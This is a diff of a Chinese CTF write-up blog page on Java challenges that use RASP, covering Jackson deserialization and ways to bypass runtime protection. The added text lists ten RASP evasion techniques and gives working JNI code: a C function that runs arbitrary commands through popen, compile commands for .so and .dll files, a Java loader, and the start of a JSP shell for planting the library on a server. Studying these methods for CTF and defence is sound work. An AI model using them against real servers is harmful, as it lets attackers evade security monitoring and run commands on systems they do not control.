@@ -32,8 +32,20 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234040641.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234557231.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231118200106740.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127174137966.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127174341925.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223246594.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223305762.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223318053.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223331810.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223343051.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119164847556.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119155237308.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119154915494.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231119155007555.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127213739145.png">
 <meta property="article:published_time" content="2023-11-15T13:07:25.000Z">
-<meta property="article:modified_time" content="2023-11-18T16:26:45.428Z">
+<meta property="article:modified_time" content="2023-11-27T15:06:17.645Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116172916127.png">
@@ -241,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          68k 字
+          47k 字
         
       </span>
     
@@ -252,7 +264,7 @@
         
         
         
-          569 分钟
+          393 分钟
         
       </span>
     
@@ -342,7 +354,7 @@
 
 <p>当然这种 trick 也只适用于 creator 中只有一个 <code>@JacksonInject</code> 注解的，如果有多个注解，那么 <code>&quot;&quot;</code> 的索引位置只会是一个，一样会走到 <code>_findMissing</code></p>
 <p>后面虽然不同，但都是用<code>scala-library</code>依赖的<code>CVE-2022-36944</code></p>
-<h3 id="非预期解-（简单易理解，但是有问题）"><a href="#非预期解-（简单易理解，但是有问题）" class="headerlink" title="非预期解 （简单易理解，但是有问题）"></a>非预期解 （简单易理解，但是有问题）</h3><p>题目本身的 <code>security/blacklist.txt</code> 是打包的资源文件，<strong>远程能打是因为出题人在官方 WP 中说到了远程环境其实没有黑名单和 rasp</strong></p>
+<h3 id="非预期解-（简单易理解，但是有问题，算了能解出来都是好方法）"><a href="#非预期解-（简单易理解，但是有问题，算了能解出来都是好方法）" class="headerlink" title="非预期解 （简单易理解，但是有问题，算了能解出来都是好方法）"></a>非预期解 （简单易理解，但是有问题，算了能解出来都是好方法）</h3><p>题目本身的 <code>security/blacklist.txt</code> 是打包的资源文件，<strong>远程能打是因为出题人在官方 WP 中说到了远程环境其实没有黑名单和 rasp</strong></p>
 <p>大概思路    删除黑名单 ，然后直接Jackson反序列化</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/yarocher/lazylist-cve-poc">yarocher&#x2F;lazylist-cve-poc: POC for the CVE-2022-36944 vulnerability exploit (github.com)</a></p>
 <p>唉，打包又出问题了</p>
@@ -494,10 +506,7 @@ public <span class="hljs-keyword">class</span> test &#123;
     &#125;
 &#125;</code></pre></div>
 
-
-
-
-
+<p>成不了一点</p>
 <h2 id="NeepuCTF-2023-No-Map"><a href="#NeepuCTF-2023-No-Map" class="headerlink" title="NeepuCTF 2023    No Map"></a>NeepuCTF 2023    No Map</h2><p>boogipop大佬说<strong>这道题的话假如出题人不去掉rasp的话他是出不来了</strong></p>
 <p>搞不懂，直接看吧</p>
 <p>看依赖直接是jackson反序列化</p>
@@ -839,7 +848,7 @@ public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
 <p>但只有这两个还不行，要重写<code>writeArrayTable</code>，但大佬只有该方法的图，应该还是重写有问题，我是没有打通</p>
 <h1 id="rasp"><a href="#rasp" class="headerlink" title="rasp"></a>rasp</h1><p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP">https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP</a></p>
 <p>说了那么多，但其实这两题根本不关他的事，现在就来说说它是什么</p>
-<p>RASP 全称为 Run­time Ap­pli­ca­tion Self-Pro­tec­tion，实时程序自我保护。RASP 通常嵌入在程序内部，具备实时监控危险函数调用，并阻止该危险调用的功能。与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p>
+<p>RASP 全称为 <code>Run­time Ap­pli­ca­tion Self-Pro­tec­tion</code>，实时程序自我保护。RASP 通常嵌入在程序内部，具备实时监控危险函数调用，并阻止该危险调用的功能。与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p>
 <p>Java RASP 通常使用 java agent 技术实现，即作为jar包通过javaagent加载即可</p>
 <div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">javaagent:agent.jar </span>-<span class="hljs-keyword">jar </span>web.<span class="hljs-keyword">jar</span></code></pre></div>
 
@@ -905,8 +914,26 @@ public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
 </blockquote>
 <p>根据 RASP 不同的实现，通常有两种方法绕过：</p>
 <ol>
-<li>寻找没有被限制的类或者函数来绕过，也就是绕过黑名单</li>
-<li>利用更底层的技术进行绕过，例如从 C 代码的层面进行绕过</li>
+<li><p>寻找没有被限制的类或者函数来绕过，也就是绕过黑名单</p>
+</li>
+<li><p>利用更底层的技术进行绕过，例如从 C 代码的层面进行绕过</p>
+</li>
+<li><p>更多请了解<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/16780056.html">RASP的安全攻防研究实践 - admin-神风 - 博客园 (cnblogs.com)</a></p>
+<blockquote>
+<ol>
+<li>破坏 RASP 的开关。OpenRASP 中存在一个 hook 开关，反射修改这个 hook 开关可关闭所有拦截。Jrasp 没有明显的开关可以去操控但作者也实现的类似的效果。</li>
+<li>熔断开关。很多商业化的产品有类似的CPU熔断机制，如果 CPU 达到 90%，就自动关闭 Rasp 的拦截。因此可以通过发送一些大的数据包或者流量，造成 CPU 的压力来触发 RASP 的熔断开关</li>
+<li>伪装恶意类。很多 RASP 产品是通过堆栈信息回溯的方式来判断命令执行的地方从哪里来，例如检测 behinder 时会判断堆栈是否包含net.rebeyond.behinder类开头的信息。作者给出了伪装类名的方法。</li>
+<li>新建线程绕过。新建线程可以绕过堆栈检查，但无法绕过黑白名单。</li>
+<li>Bootstrap ClassLoader 加载绕过内存马检测。某些 RASP 在检测内存马时，通过判断当前类的 ClassLoader 是否存在对应的 .class 文件落地，使用Instrumentation.appendToBootstrapClassLoaderSearch 方法加载的 jar 包是以 Bootstrap ClassLoader 加载的，因此能够绕过检测。</li>
+<li>通过 Unsafe 方式绕过。Unsafe.allocateInstance方法可以实例化一个对象而不调用它的构造方法，再去执行它的 Native 方法，从而绕过 Rasp 的检测。作者给出的示例中，通过直接执行 forkAndExec 的 Native 方法来执行命令。</li>
+<li>通过 WindowsVirtualMachine 注入 ShellCode 加载。向自身进程植入并运行 ShellCode 绕过 RASP</li>
+<li>Java 跨平台任意 Native 代码执行。</li>
+<li>弱引用 GC. 一种依托 WeakReference 弱引用的命令执行方式，有别于常规的命令执行，因此在某些场景下可以绕过。</li>
+<li>高权限场景卸载 RASP。通过获取 tools.jar 的路径，调用里面的 JVM API 来卸载 RASP</li>
+</ol>
+</blockquote>
+</li>
 </ol>
 <h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><p>MRCTF2022 springcoffee中的rasp，对<code>java.lang.ProcessImpl.start</code>进行过滤</p>
 <div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RaspTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;
@@ -967,11 +994,199 @@ public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
 <p><code>exec</code>追溯一下会发现是调用<code>ProcessImpl</code>的<code>start</code>方法，封掉了之前常见的<code>Runtime</code>,<code>ProcessBuilder</code></p>
 <p>java命令执行的方式中追溯到底层只有<code>UNIXProcess</code>和<code>ProcessImpl</code>，因此可以用<code>UNIXProcess</code>进行绕过,最终都是调用<code>forkAndExec</code>方法</p>
 <h3 id="JNI绕过RASP"><a href="#JNI绕过RASP" class="headerlink" title="JNI绕过RASP"></a>JNI绕过RASP</h3><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231118200106740.png" srcset="/img/loading.gif" lazyload alt="image-20231118200106740"></p>
-<blockquote>
-<p>前言</p>
-<p>注意你生成的java文件是否有package，如果有在后面的操作中要在对应的地方修改一下</p>
-</blockquote>
-<h4 id="JSP-shell-（不重要）"><a href="#JSP-shell-（不重要）" class="headerlink" title="JSP shell   （不重要）"></a>JSP shell   （不重要）</h4><div class="code-wrapper"><pre><code class="hljs reasonml">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP/#%E7%AC%AC%E4%B8%80%E6%AD%A5%E7%BC%96%E5%86%99-native-%E6%96%B9%E6%B3%95">Java 反序列化绕过 RASP | DummyKitty’s blog</a></p>
+<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.javasec;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span> </span>&#123;
+    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd);
+&#125;</code></pre></div>
+
+<p><code>javac .\Cmdclass.java</code></p>
+<p><code>javac -cp . .\Cmdclass.java -h com.javasec.Cmdclass</code>(java8及以上的<code>javac -h</code>会一并生成头文件)</p>
+<p><del>版本较低时生成头文件用的是<code>javah</code></del></p>
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span>
+<span class="hljs-comment">/* Header for class com_javasec_Cmdclass */</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_com_javasec_Cmdclass</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_com_javasec_Cmdclass</span>
+<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>
+<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment"> * Class:     com_javasec_Cmdclass</span>
+<span class="hljs-comment"> * Method:    execCmd</span>
+<span class="hljs-comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_com_javasec_Cmdclass_execCmd</span></span>
+<span class="hljs-function">  <span class="hljs-params">(JNIEnv *, jobject, jstring)</span></span>;
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>
+&#125;
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span></code></pre></div>
+
+<p>根据这个<code>.h</code>文件写一个c文件</p>
+<div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;com_javasec_Cmdclass.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execCmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];              <span class="hljs-comment">//定义缓冲区</span>
+    FILE *pipe = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">//打开管道，并执行命令</span>
+    <span class="hljs-keyword">if</span> (!pipe)
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//返回0表示运行失败</span>
+
+    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">feof</span>(pipe))
+    &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fgets</span>(buffer, <span class="hljs-number">128</span>, pipe))
+        &#123; <span class="hljs-comment">//将管道输出到result中</span>
+            <span class="hljs-built_in">strcat</span>(result, buffer);
+        &#125;
+    &#125;
+    <span class="hljs-built_in">pclose</span>(pipe); <span class="hljs-comment">//关闭管道</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">//返回1表示运行成功</span>
+&#125;
+<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_com_javasec_Cmdclass_execCmd</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span></span>
+<span class="hljs-function"></span>&#123;
+
+    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(env, jstr, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义存放结果的字符串数组</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == <span class="hljs-built_in">execCmd</span>(cstr, result))
+    &#123;
+       <span class="hljs-comment">// printf(result);</span>
+    &#125;
+
+    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-built_in">strcat</span>(return_messge, result);
+    jstring cmdresult = (*env)-&gt;<span class="hljs-built_in">NewStringUTF</span>(env, return_messge);
+    <span class="hljs-comment">//system();</span>
+
+    <span class="hljs-keyword">return</span> cmdresult;
+&#125;</code></pre></div>
+
+
+
+<div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-comment">//linux</span>
+gcc -fPIC -I<span class="hljs-string">&quot;$JAVA_HOME/include&quot;</span> -I<span class="hljs-string">&quot;$JAVA_HOME/include/linux&quot;</span> -shared -o libcmd<span class="hljs-selector-class">.so</span> Cmdclass<span class="hljs-selector-class">.c</span>
+
+<span class="hljs-comment">//windows</span>
+gcc -I<span class="hljs-string">&quot;%JAVA_HOME%\include&quot;</span> -I<span class="hljs-string">&quot;%JAVA_HOME%\include\win32&quot;</span> -shared -o libcmd<span class="hljs-selector-class">.dll</span> Cmdclass<span class="hljs-selector-class">.c</span>
+</code></pre></div>
+
+<p>最后system.load()加载即可  （）</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javasec;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNIDemo</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
+        System.load(<span class="hljs-string">&quot;D:\ctf文件\maze\cmd.dll&quot;</span>);
+        <span class="hljs-type">Cmdclass</span> <span class="hljs-variable">cmdclass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmdclass</span>();
+        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> cmdclass.execCmd(<span class="hljs-string">&quot;whoami&quot;</span>);
+        System.out.println(res);
+    &#125;
+&#125;</code></pre></div>
+
+<h4 id="保存一下题目成功的步骤-（不用看，这是我的）"><a href="#保存一下题目成功的步骤-（不用看，这是我的）" class="headerlink" title="保存一下题目成功的步骤 （不用看，这是我的）"></a>保存一下题目成功的步骤 （不用看，这是我的）</h4><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span></span>&#123;
+    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd); 
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>.\Cmdclass.<span class="hljs-keyword">java</span>
+<span class="hljs-keyword"></span>
+<span class="hljs-keyword">javac </span>-cp . .\Cmdclass.<span class="hljs-keyword">java </span>-h <span class="hljs-keyword">jackson.Cmdclass</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span>
+<span class="hljs-comment">/* Header for class jackson_Cmdclass */</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_jackson_Cmdclass</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_jackson_Cmdclass</span>
+<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>
+<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment"> * Class:     jackson_Cmdclass</span>
+<span class="hljs-comment"> * Method:    execCmd</span>
+<span class="hljs-comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span></span>
+<span class="hljs-function">  <span class="hljs-params">(JNIEnv *, jobject, jstring)</span></span>;
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>
+&#125;
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+</code></pre></div>
+
+<p>参照头文件写恶意c文件，包含头文件</p>
+<div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jackson_Cmdclass.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execCmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];              <span class="hljs-comment">//定义缓冲区</span>
+    FILE *pipe = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">//打开管道，并执行命令</span>
+    <span class="hljs-keyword">if</span> (!pipe)
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//返回0表示运行失败</span>
+
+    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">feof</span>(pipe))
+    &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fgets</span>(buffer, <span class="hljs-number">128</span>, pipe))
+        &#123; <span class="hljs-comment">//将管道输出到result中</span>
+            <span class="hljs-built_in">strcat</span>(result, buffer);
+        &#125;
+    &#125;
+    <span class="hljs-built_in">pclose</span>(pipe); <span class="hljs-comment">//关闭管道</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">//返回1表示运行成功</span>
+&#125;
+<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span></span>
+<span class="hljs-function"></span>&#123;
+
+    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(env, jstr, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义存放结果的字符串数组</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == <span class="hljs-built_in">execCmd</span>(cstr, result))
+    &#123;
+       <span class="hljs-comment">// printf(result);</span>
+    &#125;
+
+    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-built_in">strcat</span>(return_messge, result);
+    jstring cmdresult = (*env)-&gt;<span class="hljs-built_in">NewStringUTF</span>(env, return_messge);
+    <span class="hljs-comment">//system();</span>
+
+    <span class="hljs-keyword">return</span> cmdresult;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs shell">gcc -fPIC -I $JAVA_HOME/include  -I $JAVA_HOME/include/linux -shared -o libcmd.so Rce.c
+</code></pre></div>
+
+
+
+<h4 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h4><p>注意想要在别的地方使用这个cmd.dll时，要保证Cmdclass这个类的包名要和当时生成cmd.dll的一样</p>
+<p>不能在别的包下复制粘贴个内容一摸一样的Cmdclass，这样也是行不通的</p>
+<p>举个例子</p>
+<p>我的cmd.dll是由<code>com.javasec</code>包下的文件一步步生成的</p>
+<p>若我在另外一个包下复制粘贴Cmdclass的内容，看看是什么情况</p>
+<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> Rome;      <span class="hljs-comment">//只是package不一样</span>
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span></span>&#123;
+    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd);
+&#125;</code></pre></div>
+
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127174137966.png" srcset="/img/loading.gif" lazyload alt="image-20231127174137966"></p>
+<p><code>import</code>原来包下的Cmdclass是可以的</p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127174341925.png" srcset="/img/loading.gif" lazyload alt="image-20231127174341925"></p>
+<p>所以关键的就是Cmdclass的包名要和当初生成<code>cmd.dll</code>的一样</p>
+<h4 id="JSP-shell-（不重要，实战把so文件写入服务器的）"><a href="#JSP-shell-（不重要，实战把so文件写入服务器的）" class="headerlink" title="JSP shell   （不重要，实战把so文件写入服务器的）"></a>JSP shell   （不重要，实战把so文件写入服务器的）</h4><div class="code-wrapper"><pre><code class="hljs reasonml">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;
 &lt;%@ page import=<span class="hljs-string">&quot;java.io.File&quot;</span> %&gt;
 &lt;%@ page import=<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span> %&gt;
 &lt;%@ page import=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;
@@ -1160,92 +1375,129 @@ public <span class="hljs-keyword">class</span> TemplatesImplChain &#123;
 <li><code>cmd</code>需要执行的本地命令</li>
 <li><code>jni</code> 动态链接库文件Base64+URL编码后的字符串(<code>urlEncode(base64Encode(jniFile))</code>),<code>jni</code>参数默认可以不传但是需要手动修改jsp中的<code>COMMAND_JNI_FILE_BYTES</code>变量，<code>jni</code>参数只需要传一次，第二次请求不需要带上。</li>
 </ol>
-<h2 id="DASCTF-X-CBCTF-2023-bypassjava"><a href="#DASCTF-X-CBCTF-2023-bypassjava" class="headerlink" title="DASCTF X CBCTF 2023  bypassjava"></a>DASCTF X CBCTF 2023  bypassjava</h2><p>前面用到<code>chunked</code>编码绕过<code>getContentlength</code>就不介绍了</p>
-<p>😡服了，学Boogipop大佬生成个cmd.dll，但是解题要用so文件，虚拟机又没有java，不想装，烦死了，之前一装虚拟机就坏了</p>
-<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/#POC">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p>
-<p>[DASCTF X CBCTF 2023 Web 赛后复现 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](<a target="_blank" rel="noopener" href="https://boogipop.com/2023/11/05/DASCTF">https://boogipop.com/2023/11/05/DASCTF</a> X CBCTF 2023 Web 赛后复现 Writeup&#x2F;#JNI绕过RASP)</p>
-<p>先看大佬的，会回来补的（懒得点的可以看下面）</p>
-<p>准备 EvilClass.java</p>
-<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span>  &#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">execCmd</span><span class="hljs-params">(String cmd)</span>;
+<h2 id="DASCTF-X-CBCTF-2023-bypassjava"><a href="#DASCTF-X-CBCTF-2023-bypassjava" class="headerlink" title="DASCTF X CBCTF 2023  bypassjava"></a>DASCTF X CBCTF 2023  bypassjava</h2><p>前面用到<code>chunked</code>编码绕过<code>getContentlength</code>   （Boogipop大佬的图）</p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223246594.png" srcset="/img/loading.gif" lazyload alt="image-20231127223246594"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223305762.png" srcset="/img/loading.gif" lazyload alt="image-20231127223305762"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223318053.png" srcset="/img/loading.gif" lazyload alt="image-20231127223318053"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223331810.png" srcset="/img/loading.gif" lazyload alt="image-20231127223331810"></p>
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127223343051.png" srcset="/img/loading.gif" lazyload alt="image-20231127223343051"></p>
+<p>也就看个过程，本地调试调不了一点，根本不会啊，有没有人教我</p>
+<h3 id="JNI绕过RASP-1"><a href="#JNI绕过RASP-1" class="headerlink" title="JNI绕过RASP"></a>JNI绕过RASP</h3><p>查看rasp的jar包发现不仅hook了<code>forkAndExec</code>，还hook了 <code>loadLibrary0</code></p>
